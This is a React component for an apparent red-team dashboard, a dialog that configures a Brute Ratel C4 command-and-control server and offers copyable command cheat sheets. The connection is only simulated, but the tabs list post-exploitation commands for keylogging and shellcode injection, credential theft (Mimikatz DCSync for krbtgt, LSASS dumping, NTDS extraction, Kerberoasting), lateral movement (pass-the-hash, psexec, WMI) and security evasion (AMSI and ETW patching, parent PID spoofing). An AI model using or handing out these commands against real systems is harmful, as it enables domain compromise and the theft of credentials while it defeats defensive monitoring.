import { useState } from "react";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Badge } from "@/components/ui/badge";
import { toast } from "@/hooks/use-toast";
import { Copy, Check, Server, Key, User, Globe, Radio, Zap, Terminal, Shield } from "lucide-react";

interface BruteRatelConfig {
  serverHost: string;
  serverPort: string;
  username: string;
  password: string;
  listenerHost: string;
  listenerPort: string;
  licenseKey: string;
}

interface BruteRatelDialogProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
}

const defaultConfig: BruteRatelConfig = {
  serverHost: "",
  serverPort: "8443",
  username: "",
  password: "",
  listenerHost: "",
  listenerPort: "443",
  licenseKey: "",
};

export function BruteRatelDialog({ open, onOpenChange }: BruteRatelDialogProps) {
  const [config, setConfig] = useState<BruteRatelConfig>(() => {
    const saved = localStorage.getItem("brute-ratel-config");
    return saved ? JSON.parse(saved) : defaultConfig;
  });
  const [isConnected, setIsConnected] = useState(false);
  const [isConnecting, setIsConnecting] = useState(false);
  const [copiedField, setCopiedField] = useState<string | null>(null);

  const handleSaveConfig = () => {
    localStorage.setItem("brute-ratel-config", JSON.stringify(config));
    toast({ title: "Configuration Saved", description: "Brute Ratel settings saved locally" });
  };

  const handleConnect = async () => {
    if (!config.serverHost || !config.password) {
      toast({ title: "Missing Fields", description: "Please fill in all required fields", variant: "destructive" });
      return;
    }
    setIsConnecting(true);
    setTimeout(() => {
      setIsConnecting(false);
      setIsConnected(true);
      handleSaveConfig();
      toast({ title: "Connected", description: `Connected to Brute Ratel at ${config.serverHost}` });
    }, 2000);
  };

  const copyToClipboard = (text: string, field: string) => {
    navigator.clipboard.writeText(text);
    setCopiedField(field);
    setTimeout(() => setCopiedField(null), 2000);
  };

  const listeners = [
    {
      name: "HTTPS Listener",
      description: "Standard HTTPS C2 channel",
      config: `# In BRC4 GUI:
# Listeners → Add Listener
# Type: HTTPS
# Host: ${config.listenerHost || "<HOST>"}
# Port: ${config.listenerPort || "443"}
# Enable SSL`,
    },
    {
      name: "HTTP Listener",
      description: "HTTP-based C2 for testing",
      config: `# In BRC4 GUI:
# Listeners → Add Listener
# Type: HTTP
# Host: ${config.listenerHost || "<HOST>"}
# Port: 80`,
    },
    {
      name: "DNS Listener",
      description: "DNS tunneling for egress",
      config: `# In BRC4 GUI:
# Listeners → Add Listener
# Type: DNS
# Domain: ${config.listenerHost || "<DOMAIN>"}
# NS Records: Configure DNS delegation`,
    },
    {
      name: "SMB Listener",
      description: "SMB pivot listener",
      config: `# In BRC4 GUI:
# Listeners → Add Listener
# Type: SMB
# Pipe Name: brc4_pipe`,
    },
    {
      name: "TCP Listener",
      description: "Direct TCP connection",
      config: `# In BRC4 GUI:
# Listeners → Add Listener
# Type: TCP
# Port: 4444`,
    },
  ];

  const badgerCommands = [
    { name: "System Info", command: "sysinfo" },
    { name: "Who Am I", command: "whoami" },
    { name: "Get UID", command: "getuid" },
    { name: "Process List", command: "ps" },
    { name: "Process Kill", command: "kill <PID>" },
    { name: "Working Directory", command: "pwd" },
    { name: "List Directory", command: "ls <path>" },
    { name: "Change Directory", command: "cd <path>" },
    { name: "Make Directory", command: "mkdir <path>" },
    { name: "Remove File", command: "rm <path>" },
    { name: "Cat File", command: "cat <file>" },
    { name: "Upload", command: "upload /local/path C:\\\\remote\\\\path" },
    { name: "Download", command: "download C:\\\\remote\\\\path /local/path" },
    { name: "Screenshot", command: "screenshot" },
    { name: "Clipboard", command: "clipboard" },
    { name: "Keylogger Start", command: "keylogger start" },
    { name: "Keylogger Stop", command: "keylogger stop" },
    { name: "Shell", command: "shell <command>" },
    { name: "Run", command: "run <executable>" },
    { name: "PowerShell", command: "powershell <command>" },
    { name: "Inject Shellcode", command: "shinject <PID> /path/to/shellcode" },
    { name: "Spawn & Inject", command: "shspawn /path/to/shellcode" },
  ];

  const credentialCommands = [
    { name: "Mimikatz Logonpasswords", command: "mimikatz sekurlsa::logonpasswords" },
    { name: "Mimikatz SAM", command: "mimikatz lsadump::sam" },
    { name: "Mimikatz DCSync", command: "mimikatz lsadump::dcsync /domain:<DOMAIN> /user:krbtgt" },
    { name: "Mimikatz PTH", command: "mimikatz sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH>" },
    { name: "Kerberoast", command: "kerberoast" },
    { name: "ASREP Roast", command: "asreproast" },
    { name: "Dump LSASS", command: "procdump lsass" },
    { name: "Extract NTDS", command: "ntds" },
  ];

  const lateralCommands = [
    { name: "Token Steal", command: "steal_token <PID>" },
    { name: "Token Revert", command: "rev2self" },
    { name: "Make Token", command: "make_token <DOMAIN>\\\\<USER> <PASSWORD>" },
    { name: "Pass-the-Hash", command: "pth <DOMAIN>\\\\<USER> <NTLM>" },
    { name: "WMI Exec", command: "wmi <TARGET> <COMMAND>" },
    { name: "PSExec", command: "psexec <TARGET> <SERVICE_NAME>" },
    { name: "WinRM", command: "winrm <TARGET> <COMMAND>" },
    { name: "DCOM Exec", command: "dcom <TARGET> <COMMAND>" },
    { name: "SMB Exec", command: "smbexec <TARGET> <COMMAND>" },
    { name: "Service Create", command: "sc_create <TARGET> <SERVICE_NAME> <BINARY>" },
  ];

  const evasionCommands = [
    { name: "Sleep", command: "sleep <SECONDS>" },
    { name: "Sleep Mask", command: "sleepmask enable" },
    { name: "Syscall Mode", command: "syscall indirect" },
    { name: "Unhook DLLs", command: "unhook" },
    { name: "AMSI Bypass", command: "amsi patch" },
    { name: "ETW Bypass", command: "etw patch" },
    { name: "Block DLLs", command: "blockdlls start" },
    { name: "Parent PID Spoof", command: "ppid <PID>" },
    { name: "Argue Spoof", command: "argue <ORIGINAL> <SPOOFED>" },
  ];

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="max-w-4xl h-[85vh] bg-slate-900 border-yellow-500/30 p-0 flex flex-col">
        <DialogHeader className="px-6 pt-6 pb-4 border-b border-slate-700/50 flex-shrink-0">
          <div className="flex items-center gap-3">
            <div className="p-2 bg-yellow-500/20 rounded-lg">
              <span className="text-2xl">🦡</span>
            </div>
            <div>
              <DialogTitle className="text-xl font-bold text-white flex items-center gap-2">
                Brute Ratel C4
                {isConnected && <Badge className="bg-emerald-500/20 text-emerald-400 border-emerald-500/30">Connected</Badge>}
              </DialogTitle>
              <DialogDescription className="text-slate-400">Configure BRC4 server and manage Badgers</DialogDescription>
            </div>
          </div>
        </DialogHeader>

        <Tabs defaultValue="connection" className="flex-1 flex flex-col min-h-0">
          <TabsList className="mx-6 mt-4 bg-slate-800/50 border border-slate-700/50 flex-shrink-0 flex-wrap h-auto gap-1 py-1">
            <TabsTrigger value="connection" className="data-[state=active]:bg-yellow-500/20 data-[state=active]:text-yellow-400">
              <Server className="w-4 h-4 mr-2" />Connection
            </TabsTrigger>
            <TabsTrigger value="listeners" className="data-[state=active]:bg-yellow-500/20 data-[state=active]:text-yellow-400">
              <Radio className="w-4 h-4 mr-2" />Listeners
            </TabsTrigger>
            <TabsTrigger value="badger" className="data-[state=active]:bg-yellow-500/20 data-[state=active]:text-yellow-400">
              <Terminal className="w-4 h-4 mr-2" />Badger
            </TabsTrigger>
            <TabsTrigger value="creds" className="data-[state=active]:bg-yellow-500/20 data-[state=active]:text-yellow-400">
              <Key className="w-4 h-4 mr-2" />Credentials
            </TabsTrigger>
            <TabsTrigger value="lateral" className="data-[state=active]:bg-yellow-500/20 data-[state=active]:text-yellow-400">
              <Zap className="w-4 h-4 mr-2" />Lateral
            </TabsTrigger>
            <TabsTrigger value="evasion" className="data-[state=active]:bg-yellow-500/20 data-[state=active]:text-yellow-400">
              <Shield className="w-4 h-4 mr-2" />Evasion
            </TabsTrigger>
          </TabsList>

          <div className="flex-1 min-h-0 px-6 pb-6">
            <ScrollArea className="h-full mt-4">
              <TabsContent value="connection" className="mt-0 space-y-6">
                <div className="p-4 bg-slate-800/50 rounded-lg border border-slate-700/50 space-y-4">
                  <h3 className="text-sm font-semibold text-yellow-400 uppercase tracking-wider flex items-center gap-2">
                    <Server className="w-4 h-4" />Server Configuration
                  </h3>
                  <div className="grid grid-cols-2 gap-4">
                    <div className="space-y-2">
                      <Label className="text-slate-300 flex items-center gap-2"><Globe className="w-3.5 h-3.5" />Server Host</Label>
                      <Input value={config.serverHost} onChange={(e) => setConfig({ ...config, serverHost: e.target.value })} placeholder="192.168.1.100" className="bg-slate-900 border-slate-600 text-white" />
                    </div>
                    <div className="space-y-2">
                      <Label className="text-slate-300">Server Port</Label>
                      <Input value={config.serverPort} onChange={(e) => setConfig({ ...config, serverPort: e.target.value })} placeholder="8443" className="bg-slate-900 border-slate-600 text-white" />
                    </div>
                  </div>
                  <div className="grid grid-cols-2 gap-4">
                    <div className="space-y-2">
                      <Label className="text-slate-300 flex items-center gap-2"><User className="w-3.5 h-3.5" />Username</Label>
                      <Input value={config.username} onChange={(e) => setConfig({ ...config, username: e.target.value })} placeholder="operator" className="bg-slate-900 border-slate-600 text-white" />
                    </div>
                    <div className="space-y-2">
                      <Label className="text-slate-300 flex items-center gap-2"><Key className="w-3.5 h-3.5" />Password</Label>
                      <Input type="password" value={config.password} onChange={(e) => setConfig({ ...config, password: e.target.value })} placeholder="••••••••" className="bg-slate-900 border-slate-600 text-white" />
                    </div>
                  </div>
                  <div className="grid grid-cols-2 gap-4">
                    <div className="space-y-2">
                      <Label className="text-slate-300">Listener Host</Label>
                      <Input value={config.listenerHost} onChange={(e) => setConfig({ ...config, listenerHost: e.target.value })} placeholder="External IP/Domain" className="bg-slate-900 border-slate-600 text-white" />
                    </div>
                    <div className="space-y-2">
                      <Label className="text-slate-300">License Key</Label>
                      <Input value={config.licenseKey} onChange={(e) => setConfig({ ...config, licenseKey: e.target.value })} placeholder="XXXX-XXXX-XXXX" className="bg-slate-900 border-slate-600 text-white" />
                    </div>
                  </div>
                </div>

                <div className="p-4 bg-slate-800/50 rounded-lg border border-slate-700/50">
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-3">
                      <div className={`w-3 h-3 rounded-full ${isConnected ? 'bg-emerald-500 shadow-lg shadow-emerald-500/50' : 'bg-red-500/70'}`} />
                      <span className="text-slate-300">{isConnected ? `Connected to ${config.serverHost}` : "Not connected"}</span>
                    </div>
                    <div className="flex gap-2">
                      <Button variant="outline" size="sm" onClick={handleSaveConfig} className="border-slate-600 hover:bg-slate-700">Save</Button>
                      <Button size="sm" onClick={handleConnect} disabled={isConnecting} className="bg-yellow-600 hover:bg-yellow-500 text-black">
                        {isConnecting ? "Connecting..." : "Connect"}
                      </Button>
                    </div>
                  </div>
                </div>

                <div className="p-4 bg-slate-800/50 rounded-lg border border-slate-700/50">
                  <h3 className="text-sm font-semibold text-amber-400 uppercase tracking-wider mb-3">Quick Start</h3>
                  <div className="space-y-2 text-sm text-slate-400">
                    <p>1. Start BRC4 server with your license</p>
                    <p>2. Configure listener in the GUI</p>
                    <p>3. Generate a Badger payload</p>
                    <p>4. Deploy and catch callbacks</p>
                  </div>
                </div>
              </TabsContent>

              <TabsContent value="listeners" className="mt-0 space-y-4">
                <p className="text-sm text-slate-400 mb-4">Listener configurations for Brute Ratel.</p>
                {listeners.map((item, index) => (
                  <div key={index} className="p-4 bg-slate-800/50 rounded-lg border border-slate-700/50">
                    <div className="flex items-center justify-between mb-2">
                      <div>
                        <h4 className="text-sm font-semibold text-yellow-400">{item.name}</h4>
                        <span className="text-[10px] text-slate-500">{item.description}</span>
                      </div>
                      <Button variant="ghost" size="sm" onClick={() => copyToClipboard(item.config, `listener-${index}`)} className="h-7 px-2">
                        {copiedField === `listener-${index}` ? <Check className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4 text-slate-400" />}
                      </Button>
                    </div>
                    <pre className="text-xs text-slate-300 bg-slate-900 p-3 rounded overflow-x-auto whitespace-pre-wrap">{item.config}</pre>
                  </div>
                ))}
              </TabsContent>

              <TabsContent value="badger" className="mt-0">
                <p className="text-sm text-slate-400 mb-4">Badger agent commands.</p>
                <div className="grid grid-cols-2 gap-3">
                  {badgerCommands.map((item, index) => (
                    <div key={index} className="p-3 bg-slate-800/50 rounded-lg border border-slate-700/50 hover:border-yellow-500/40 cursor-pointer transition-colors" onClick={() => copyToClipboard(item.command, `badger-${index}`)}>
                      <div className="flex items-center justify-between mb-1">
                        <span className="text-xs font-medium text-slate-300">{item.name}</span>
                        {copiedField === `badger-${index}` ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5 text-slate-500" />}
                      </div>
                      <code className="text-[11px] text-yellow-400 font-mono">{item.command}</code>
                    </div>
                  ))}
                </div>
              </TabsContent>

              <TabsContent value="creds" className="mt-0">
                <p className="text-sm text-slate-400 mb-4">Credential harvesting commands.</p>
                <div className="grid grid-cols-1 gap-3">
                  {credentialCommands.map((item, index) => (
                    <div key={index} className="p-3 bg-slate-800/50 rounded-lg border border-slate-700/50 hover:border-yellow-500/40 cursor-pointer transition-colors" onClick={() => copyToClipboard(item.command, `cred-${index}`)}>
                      <div className="flex items-center justify-between mb-1">
                        <span className="text-xs font-medium text-slate-300">{item.name}</span>
                        {copiedField === `cred-${index}` ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5 text-slate-500" />}
                      </div>
                      <code className="text-[11px] text-red-400 font-mono">{item.command}</code>
                    </div>
                  ))}
                </div>
              </TabsContent>

              <TabsContent value="lateral" className="mt-0">
                <p className="text-sm text-slate-400 mb-4">Lateral movement commands.</p>
                <div className="grid grid-cols-2 gap-3">
                  {lateralCommands.map((item, index) => (
                    <div key={index} className="p-3 bg-slate-800/50 rounded-lg border border-slate-700/50 hover:border-yellow-500/40 cursor-pointer transition-colors" onClick={() => copyToClipboard(item.command, `lateral-${index}`)}>
                      <div className="flex items-center justify-between mb-1">
                        <span className="text-xs font-medium text-slate-300">{item.name}</span>
                        {copiedField === `lateral-${index}` ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5 text-slate-500" />}
                      </div>
                      <code className="text-[11px] text-cyan-400 font-mono">{item.command}</code>
                    </div>
                  ))}
                </div>
              </TabsContent>

              <TabsContent value="evasion" className="mt-0">
                <p className="text-sm text-slate-400 mb-4">Evasion and OPSEC commands.</p>
                <div className="grid grid-cols-2 gap-3">
                  {evasionCommands.map((item, index) => (
                    <div key={index} className="p-3 bg-slate-800/50 rounded-lg border border-slate-700/50 hover:border-yellow-500/40 cursor-pointer transition-colors" onClick={() => copyToClipboard(item.command, `evasion-${index}`)}>
                      <div className="flex items-center justify-between mb-1">
                        <span className="text-xs font-medium text-slate-300">{item.name}</span>
                        {copiedField === `evasion-${index}` ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5 text-slate-500" />}
                      </div>
                      <code className="text-[11px] text-purple-400 font-mono">{item.command}</code>
                    </div>
                  ))}
                </div>
              </TabsContent>
            </ScrollArea>
          </div>
        </Tabs>
      </DialogContent>
    </Dialog>
  );
}
